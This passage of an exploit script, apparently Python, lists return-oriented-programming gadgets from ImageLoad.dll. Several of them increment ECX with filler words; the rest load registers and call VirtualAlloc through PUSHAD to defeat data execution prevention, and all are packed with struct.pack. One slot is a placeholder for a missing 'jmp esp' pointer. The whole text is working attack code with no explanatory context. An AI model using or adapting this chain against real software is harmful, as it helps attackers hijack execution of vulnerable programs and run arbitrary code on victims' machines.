	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x100228f3,  # POP EDI # RETN [ImageLoad.dll] 
	0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
	0x1001e811,  # POP ESI # RETN [ImageLoad.dll] 
	0x10021e9d,  # JMP [EAX] [ImageLoad.dll]
	0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
	0x1004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]
	0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
	0xDDDDDDDD,  # <- Unable to find ptr to 'jmp esp'
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)